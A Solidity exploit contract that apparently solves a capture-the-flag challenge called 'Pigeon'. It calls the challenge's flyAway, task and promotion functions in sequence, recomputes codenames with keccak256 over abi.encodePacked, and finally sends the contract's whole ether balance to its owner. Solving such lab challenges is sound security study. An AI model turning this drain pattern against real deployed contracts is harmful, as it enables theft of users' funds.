// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import "./Setup.sol";
import "./Pigeon.sol";

contract PigeonExploit {
    Pigeon public chall;
    bytes32 public codename;
    address public immutable owner;
    constructor(address _owner) payable {
        owner = _owner;
    }
    mapping (address => uint256) check;
    receive() external payable {}

    function setTarget(address _target) public  {
        chall = Pigeon(address(Setup(payable(_target)).pigeon()));
    }
    function run() external {
        Step1();
        Step2();
        Step3();
    }
    function Step1() public  {
        codename = chall.becomeAPigeon("Numbu", "h5");
        chall.flyAway(codename, 0);
        (bool success,) = owner.call{value: 4 ether}("");
        require(success, "Transfer failed.");
        chall.task(codename, owner, owner.balance);
        chall.promotion(codename, 1, "Numbu", "h3");
        codename = getCodename("Numbu", "h3");
    }
    function Step2() public  {
        chall.flyAway(codename, 1);
        (bool success,) = owner.call{value: 10 ether}("");
        require(success, "Transfer failed.");
        chall.task(codename, owner, owner.balance);
        chall.promotion(codename, 2, "Numbu", "h1");
        codename = getCodename("Numbu", "h1");
    }
    function Step3() public  {
        chall.flyAway(codename, 2);
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed.");
    }
    function getCodename(string memory code, string memory name) public pure returns (bytes32 codeName)  {
        codeName = keccak256(abi.encodePacked(code, name));
    }
}